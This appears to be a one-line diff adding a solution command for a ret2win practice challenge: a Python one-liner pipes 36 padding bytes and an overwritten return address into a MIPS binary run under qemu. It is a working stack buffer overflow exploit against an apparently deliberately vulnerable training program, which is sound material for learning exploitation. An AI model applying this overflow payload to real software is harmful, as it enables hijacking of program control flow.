@@ -1,0 +1,1 @@
+python3 -c "import sys; sys.stdout.buffer.write(b'A'*36 + b'\x00\x0a\x40\x00')" |  qemu-mipsel -L /usr/mipsel-linux-gnu ret2win_mipsel
